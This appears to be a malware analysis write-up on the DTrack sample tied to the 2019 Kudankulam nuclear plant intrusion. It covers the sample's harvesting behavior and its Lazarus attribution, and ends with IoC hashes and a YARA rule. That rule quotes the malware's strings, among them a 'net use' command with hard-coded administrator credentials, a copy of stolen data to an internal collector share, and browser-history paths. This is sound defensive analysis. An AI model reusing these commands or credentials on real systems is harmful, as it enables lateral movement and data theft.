The news was announced on Monday\n[October 28 by the Indian strategic infrastructure. In a press release on arstechnica, NPCIL](https://arstechnica.com/information-technology/2019/10/indian-nuclear-power-company-confirms-north-korean-malware-attack/)\nAssociate Director A. K. Nema stated, “Identification of malware in NPCIL system is correct. The\nmatter was conveyed by CERT-In [India’s national computer emergency response team] when it\nwas noticed by them on September 4, 2019.”\n\nNPCIL Press Release\n\n\n-----\n\n[On October 28 at 2.37PM twitter user @a_tweeter_user posted a Virus Total link claiming it was](https://twitter.com/a_tweeter_user/status/1188811977851887616?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1188853620541775872&ref_url=https%3A%2F%2Farstechnica.com%2Finformation-technology%2F2019%2F10%2Findian-nuke-plants-network-reportedly-hit-by-malware-tied-to-n-korea%2F)\nthe Malware employee during the KKNPP (Kudankulam Nuclear Power Plant) cyber attack. When\nI saw that link, I ‘ve been so fascinated about that cyber attack, that I decided to take a closer look\nto such a Malware in order to better understand what it is and who could be behind such a\ndangerous cyber attack !\n\n## Technical Analysis\n\n### Hash bfb39f486372a509f307cde3361795a2f9f759cbeb4cac07562dcbae‐ bc070364\n\n Threat KKNPP Targeted Attack\n\n\n### Brief Descrip‐ tion\n\n\n### According to @a_tweeter_user that sample was used to target KKNPP the biggest Nuclear Plant in India\n\n\n### Ssdeep 24576:4AzX0QVt4LjwctL0fn7J7eKj6a5VCxoq:bRccw47J7Fj99q\n\nThe analyzed file is a Windows PE seen in Virust Total on 2019-10-27 at 00:57:32. It looks like\nbeen compiled on 2019-07-29 13:36:26 for a 32 bit machine. Analyzing the sample behavior it\nlooks like harvesting specific information on the target machine and it definitely is comparable to a\nwell defined targeted attack. Indeed the attacker knew the victim’s environment a priori. Many\nspecific actions-and-modules have been found but we might sum up the observed behavior in few\nsimple and consecutive actions. Once the sample is run it performs 3 main actions: (i) Importing\nall the required functions and prepare all the needed modules before implementing the real attack\n(for example logger, temporary files and static functions) (ii) find local information and (iii) copy\ninformation to a central node. The following image shows the three main functions inside the\nWinMain.\n\nMain Functions\n\nOne of the most interesting function is the sub_DE33BO where the sample starts to collect\ninformation regarding: (i) local **IP** **Addresses, (ii) Task** **listing, (iii) information** **on** **routing** **and**\n**interfaces. Everything is logged into a temporary file located in** %APPDATA%/Temp/temp/ .\n\n\n-----\n\nNetwork Information Harvesting\n\nNetwork information is not the only thing the sample is looking for. Indeed it looks for many\nsoftware assuming they are located into different system volumes such as for example:\n\ne:\\html\\PowerShellCorpus\\Github\\ . The following image shows some of the collected files\nassumed to be in different volumes (C and E).\n\nThe Sample looks for software in specific system paths\n\nIt is definitely interesting to see that the attacker assumes the existence of a C and E drives. It\nlooks like the attacker already knew what to search on the victim machine. In addition to such\ninformation the sample looks for moz_places file and by loading a SQLite driver it begins a\nquerying routine to get urls and rootpage . The Malware has modification modules which\ncould be used to modifies entry points into moz_places but I did not see any running usage on it.\nThen every collected information is saved into a folder tree that looks like the following one\n\n192.168.56.2 folder holds the found information regarding harvested software on the victim\nmachine having as IP address the one used as folder name. Everything is well organized and the\noutput of each file is human readable and well curated as well. It looks like the sample could be\n**weaponized with more modules holding different behaviors. Once the harvesting process**\n\n\n-----\n\nends its life-cycle, the analyzed sample\ncompresses the entire folder, places it on\n\nPPDATA%/Temp/~77FDD3EAMT.tmp and sends\nit to 10.38.1.35 known as\n\ncontroller5kk . Then it copies that file from\nthe C: drive on the target machine to a more\nhidden directory such as:\n\nWindows\\Temp\\MpLogs, by assuming that\ndirectory is defined on the target machine.\nFinally it deletes the just moved file\n( ~77FDD3EAMT.tmp ) from the shared folder\n\nC:\\ (where it was placed before being\ncopied). At that stage it looks like the attacker\nowns the destination machine ( 10.38.1.35 )\nsince acting as a central collector for every\ninfected machine. The following image shows\nthe code section including customized\nfunctions, address and credentials of the\npower implant.\n\nThe sample saves information on a hidden folder tree\n\nLateral Movement Crafted into Windows PE\n\nI believe it is interesting for every analyst to read IP addresses and user credentials directly hardcoded into the sample, since if those information are correct (as you might assume once you read\nthe press release note) It is not hard to believe that we are analyzing a sample belonging to a\ntargeted attack, crafted for harvesting information and eventually to control victim machines. The\n**analyzed sample is quite modular and it can be weaponized with many capabilities for**\n**example: external communication over TLS, Command and Control and RAT, but on my**\n**runs the sample never showed such additional behaviors.**\n\n## Attribution\n\n\n-----\n\nAttribution is always a very hard and challenging section in Malware Analyses. The analyzed\n[sample is very close to what Kaspersky defined as DTrack in HERE. Two main strong similarities](https://securelist.com/my-name-is-dtrack/93338/)\nto DTrack took me to believe we are facing an initial information gathering stage powered by a\ncustomized DTrack Malware. Two of the main similarities are the following ones:\n\n**Initial** **Sample** **in-Memory Manipulation** **stage between OE (Original Entry Point) and**\nWinMain function.\n**String** **Manipulation** **function looking for “CCS_”.**\n\nThe following image shows the strong similarities between the string preparation function\navailable on address 0x8BB041. On the left side the analyzed sample while on the right side a\n[screen coming from Kaspersky analysis ( published on securelist)](https://securelist.com/my-name-is-dtrack/93338/)\n\nSimilarities with DTrack\n\nBoth samples look for “CCS_” string and manipulate it in the same way. However DTrack is\nhistorically related to Lazarus / APT38 group, a threat organization also known as Hidden Cobra\n[and attributed (by FireEye) to North-Corea state which actually is used to target -at least in the](https://content.fireeye.com/apt/rpt-apt38)\npast months- financial institutions. The group has been active since at least 2009 and was\nreportedly responsible for the November 2014 destructive wiper attack against Sony Pictures\nEntertainment as part of a campaign named Operation Blockbuster by Novetta (from MITRE).\nAPT38 is not well-known for attacking critical infrastructures, moreover DTrack is a well-known\nMalware distributed over ATM, in order to attack financial institutions all over the world. However\nthe attack phase is actually aligned with Lazarus modus-operandi as reported in the FireEye\n[document (HERE) Figure 5 page 16.](https://content.fireeye.com/apt/rpt-apt38)\n\nAs a matter of fact, Lazarus is used to initiate a separate phase of Information Gathering before\nthe real attack takes place. If you focus on target, it’s known that Lazarous attacks financial\ninstitution but they performed destruction attacks in the past years (such as wiping Sony\nEntertainment) as well as gov-based attacks (such as the Komisja Nadzoru Finansowego, or KNF\nattack). At that point every reader would ask: “Is it APT38 moving their targets to critical\ninfrastructure or are we experiencing a well crafted false flag ? ” Hard to answer with scientific\n\n\n-----\n\nprecision, in my personal opinion it’s going to be an open question for at least few time, but if I\nhad to bet on, I would probably bet on Lazarus that they are adding to their attack plan more\nstrategic targets like Nuclear Plants.\n\n## IoC\n\nHash:\n\nbfb39f486372a509f307cde3361795a2f9f759cbeb4cac07562dcbaebc070364\n(verified)\n3cc9d9a12f3b884582e5c4daf7d83c4a510172a836de90b87439388e3cde3682 (not\n**directly verified)**\n93a01fbbdd63943c151679d037d32b1d82a55d66c6cb93c40ff63f2b770e5ca9 (not\n**directly verified)**\na0664ac662802905329ec6ab3b3ae843f191e6555b707f305f8f5a0599ca3f68 (not\n**directly verified)**\nc5c1ca4382f397481174914b1931e851a9c61f029e6b3eb8a65c9e92ddf7aa4c (not\n**directly verified)**\n\n## Yara Rule\n\n\n-----\n\nimport \"pe\"\n\nrule lazarus_dtrack {\nmeta:\ndescription = \"lazarus - dtrack on nuclear implant KKNPP\"\ndate = \"2019-11-02\"\nhash1 = \"bfb39f486372a509f307cde3361795a2f9f759cbeb4cac07562dcbaebc070364\"\nstrings:\n$x1 = \"move /y %s \\\\\\\\10.38.1.35\\\\C$\\\\Windows\\\\Temp\\\\MpLogs\\\\\" fullword ascii\n$x2 = \"Execute_%s.log\" fullword ascii\n$x3 = \"%s\\\\%s\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\" fullword ascii\n$s4 = \"CCS_/c ping -n 3 127.0.0.1 >NUL & echo EEEE > \\\"%s\\\"\" fullword ascii\n$s5 = \"%s\\\\%s\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\History\"\nfullword ascii\n$s6 = \"Usage: .system COMMAND\" fullword ascii\n$s7 = \"Usage: .dump ?--preserve-rowids? ?--newlines? ?LIKE-PATTERN?\" fullword ascii\n$s8 = \"CCS_shell32.dll\" fullword ascii\n$s9 = \"%s:%d: expected %d columns but found %d - filling the rest with NULL\"\nfullword ascii\n$s10 = \"%s:%d: expected %d columns but found %d - extras ignored\" fullword ascii\n$s11 = \"%s\\\\%s\\\\AppData\\\\Application Data\\\\Mozilla\\\\Firefox\\\\Profiles\" fullword\nascii\n$s12 = \"net use \\\\\\\\10.38.1.35\\\\C$ su.controller5kk /user:KKNPP\\\\administrator\"\nfullword ascii\n$s13 = \"VALUES(0,'memo','Missing SELFTEST table - default checks only',''),\n(1,'run','PRAGMA integrity_check','ok')\" fullword ascii\n$s14 = \"CCS_Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like\nGecko) Chrome/54.0.2840.99 Safari/537.36\" fullword ascii\n$s15 = \"Usage %s sub-command ?switches...?\" fullword ascii\n$s16 = \"Usage: .log FILENAME\" fullword ascii\n$s17 = \"Content-Disposition: form-data; name=\\\"result\\\"; filename=\\\"%s.bmp\\\"\"\nfullword ascii\n$s18 = \"%z%sSELECT pti.name FROM \\\"%w\\\".sqlite_master AS sm JOIN\npragma_table_info(sm.name,%Q) AS pti WHERE sm.type='table'\" fullword ascii\n$s19 = \"CCS_kernel32.dll\" fullword ascii\n$s20 = \"CCS_Advapi32.dll\" fullword ascii\ncondition:\nuint16(0) == 0x5a4d and filesize < 2000KB and\n( pe.imphash() == \"75171549224b4292974d6ee3cf397db8\" or ( 1 of ($x*) or 4 of them )\n)\n}\n\n\n-----",
